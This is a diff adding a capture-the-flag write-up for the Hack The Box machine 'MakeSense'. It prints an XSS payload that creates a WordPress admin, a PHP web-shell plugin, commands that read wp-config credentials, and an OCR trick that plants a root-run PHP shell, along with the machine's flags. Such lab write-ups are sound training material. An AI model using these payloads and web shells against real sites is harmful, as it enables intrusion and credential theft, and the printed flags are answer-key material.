@@ -1,0 +1,271 @@
+# HTB MakeSense Write-Up
+
+## Overview
+
+- **OS**: Linux
+- **Difficulty**: Medium/Hard
+- **Target IP**: `$IP`
+- **VPN IP**: `$VPN`
+
+## Attack Chain Summary
+
+1. **Web Recon** → WordPress site with WebAgency theme, voice recording feature
+2. **XSS** → Create admin user via voice recording encryption bypass
+3. **WordPress RCE** → Upload malicious plugin → `www-data` shell
+4. **User Flag** → Read `wp-config.php` → reuse credentials → `su admin` → `user.txt`
+5. **Privilege Escalation** → Internal OCR4 service (port 8001, running as root) → Tesseract handwriting recognition → save output to file → generate PNG with PHP code → OCR recognizes and saves as `.php` → execute commands as root
+
+---
+
+## 1. Reconnaissance
+
+### Port Scan
+
+```bash
+nmap -p- -sV -sC $IP -oN nmap_all.txt
+```
+
+**Open ports:**
+- `22/tcp` — OpenSSH 9.6p1
+- `443/tcp` — Apache 2.4.58, WordPress 7.0
+- `80/tcp` — filtered
+- `8001/tcp` — filtered (internal service)
+
+### Web Enumeration
+
+The HTTPS site redirects to `makesense.htb`. WordPress 7.0 is running with the **WebAgency** theme (from `/wp-content/themes/webagency/`).
+
+### WordPress Plugin Enumeration
+
+```bash
+wpscan --url https://$IP/ --disable-tls-checks
+```
+
+Identified the presence of plugins and the active theme.
+
+---
+
+## 2. XSS → Admin Creation
+
+### Voice Recording Feature
+
+The WebAgency theme has a **voice recording** feature that uses:
+- Transformers.js (Whisper AI) for speech-to-text
+- AES-GCM encryption for transmitting recordings
+- Symbol mapping for HTML entity conversion
+
+### Finding the Encryption Key
+
+The file `/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js` contains:
+
+```js
+const ENCRYPTION_KEY = "bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI";
+```
+
+### Understanding Symbol Mapping
+
+The `applySymbolMapping()` function converts spoken words to HTML symbols:
+
+| Spoken Word | Symbol |
+|-------------|--------|
+| `open bracket` | `<` |
+| `close bracket` | `>` |
+| `single quote` | `'` |
+| `double quote` | `"` |
+| `equals` | `=` |
+| `open paren` | `(` |
+| `close paren` | `)` |
+| `slash` | `/` |
+
+### AJAX Endpoints
+
+Three AJAX actions were discovered:
+- `submit_contact_form`
+- `save_voice_results` (encrypted)
+- `save_voice_raw` (raw)
+
+### XSS Payload
+
+Encrypted an XSS payload that creates a new admin user:
+
+```
+open bracket script close bracket
+  fetch(open apostrophe /wp-admin/user-new.php close apostrophe)
+  ... create admin user xploit:Xploit123!
+open bracket /script close bracket
+```
+
+Encrypted with AES-GCM and sent to `save_voice_results` with `post_id=69`. The XSS executed in the admin panel → created user `xploit`.
+
+---
+
+## 3. WordPress RCE
+
+### Login via XMLRPC
+
+```bash
+# Generate auth cookie
+
+curl -sk 'https://$IP/xmlrpc.php' \
+  -H "Host: makesense.htb" \
+  -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>xploit</string></value></param><param><value><string>Xploit123!</string></value></param></params></methodCall>'
+```
+
+### Malicious Plugin Upload
+
+```bash
+# Create plugin zip
+
+cat > /tmp/exploit-plugin.php << 'EOF'
+<?php
+/**
+ * Plugin Name: Exploit Plugin
+ * Version: 1.0
+ */
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+EOF
+
+cd /tmp && zip exploit-plugin.zip exploit-plugin.php
+
+# Upload via WordPress admin
+
+curl -sk 'https://$IP/wp-admin/plugin-install.php' \
+  -H "Host: makesense.htb" \
+  -b "wordpress_cookie=..." \
+  -F "pluginzip=@exploit-plugin.zip" \
+  -F "install-plugin-submit=Install Now"
+```
+
+### Shell Access
+
+```bash
+curl -sk 'https://$IP/wp-content/plugins/exploit-plugin/exploit-plugin.php?cmd=id' \
+  -H "Host: makesense.htb"
+```
+
+Output: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
+
+---
+
+## 4. User Flag
+
+### Reading wp-config.php
+
+```bash
+curl -sk 'https://$IP/wp-content/plugins/exploit-plugin/exploit-plugin.php?cmd=cat wp-config.php' \
+  -H "Host: makesense.htb"
+```
+
+Found credentials:
+
+```php
+define('DB_USER', 'walter');
+define('DB_PASSWORD', 'JbhHDAEgXvri3!');
+```
+
+### Switching to Admin
+
+The password is reused for the `admin` system user:
+
+```bash
+curl -sk 'https://$IP/shell.php?cmd=echo JbhHDAEgXvri3! | su admin -c "cat /home/admin/user.txt"'
+```
+
+**User Flag**: `7c145c50849fb5dbd8b284e7a32ec333`
+
+---
+
+## 5. Privilege Escalation to Root
+
+### Discovering the Internal OCR4 Service
+
+From the process list:
+
+```
+root  1397  php -S 127.0.0.1:8001 -t /root/ocr4/
+```
+
+An internal PHP-built-in server running as **root** on port 8001, serving a handwriting OCR application called "OCR4" from `/root/ocr4/`.
+
+### OCR4 Application Analysis
+
+The app at `http://127.0.0.1:8001/`:
+- Uses basic auth (`walter:JbhHDAEgXvri3!`)
+- Canvas drawing interface → handwriting recognition via **Tesseract 5.3.4**
+- Recognized text can be **saved to a file**
+- Save parameters: `ocr_id` (hidden), `filename`, `save_output=1`
+
+### Exploit Strategy
+
+The save endpoint writes recognized text to files within `/root/ocr4/saved/`. By crafting a PNG image containing PHP code as "handwritten" text, Tesseract will recognize it, and the app will save the PHP code to a `.php` file — executed as root when accessed.
+
+### Generating the PNG
+
+Used Python PIL to render PHP code as text in a clear monospace font:
+
+```python
+from PIL import Image, ImageDraw, ImageFont
+img = Image.new('RGB', (700, 60), 'white')
+d = ImageDraw.Draw(img)
+font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf', 18)
+d.text((5, 20), '<?php system($_GET["c"]); ?>', fill='black', font=font)
+img.save('shell.png')
+```
+
+### Exploit Execution
+
+```bash
+# Upload the PNG and run the exploit via SSH as walter
+
+B64=$(base64 -w0 shell.png)
+
+# Step 1: OCR processing with cookie jar
+
+curl -s -c /tmp/jar -b /tmp/jar -X POST 'http://127.0.0.1:8001/' \
+  -u 'walter:JbhHDAEgXvri3!' \
+  --data-urlencode "canvas_image=data:image/png;base64,$B64" | \
+  grep -oP 'ocr_id" value="\K[^"]+'
+
+# Step 2: Save recognized text as PHP file
+
+curl -s -b /tmp/jar -X POST 'http://127.0.0.1:8001/' \
+  -u 'walter:JbhHDAEgXvri3!' \
+  --data "ocr_id=$OCR_ID&filename=shell.php&save_output=1"
+
+# Step 3: Execute as root
+
+curl -s 'http://127.0.0.1:8001/saved/shell.php?c=cat%20/root/root.txt' \
+  -u 'walter:JbhHDAEgXvri3!'
+```
+
+**Root Flag**: `95ec328de7cf1d1392ad5a7001f2e15c`
+
+### Verification
+
+```bash
+curl -s 'http://127.0.0.1:8001/saved/shell.php?c=id' \
+  -u 'walter:JbhHDAEgXvri3!'
+```
+
+Output: `uid=0(root) gid=0(root) groups=0(root)`
+
+---
+
+## Flags
+
+| Flag | Value |
+|------|-------|
+| **User** | `7c145c50849fb5dbd8b284e7a32ec333` |
+| **Root** | `95ec328de7cf1d1392ad5a7001f2e15c` |
+
+---
+
+## Lessons Learned
+
+1. **Encryption is not authentication** — XSS payload bypassed AES-GCM encryption because it only encrypted the transport, not the content.
+2. **Credential reuse** — WordPress database password was reused for system user login.
+3. **OCR as attack surface** — Handwriting-to-text services can be exploited to write arbitrary files when the output filename and content are both attacker-controlled.
+4. **Cookie jar continuity** — The OCR4 save endpoint requires the same session (cookie) as the OCR request; `-c` and `-b` flags in curl are essential.
+5. **Font selection matters** — Tesseract recognition accuracy depends heavily on font choice; DejaVuSansMono at 18pt produced reliable results.
